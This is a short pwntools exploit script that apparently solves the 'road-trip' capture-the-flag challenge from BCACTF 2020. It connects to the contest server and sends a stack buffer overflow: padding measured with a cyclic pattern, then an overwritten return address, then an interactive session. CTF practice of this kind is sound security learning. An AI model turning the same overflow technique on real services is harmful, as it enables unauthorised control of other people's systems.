from pwn import *

# p = process("./road-trip")
# input("Attach GDB")
p = remote("camp2020.bcactf.com", 10005)

# padding = cyclic(100)
padding = b"A" * cyclic_find("faaa")
pointer = p64(0x4006c7)

p.send(padding + pointer)

p.interactive()
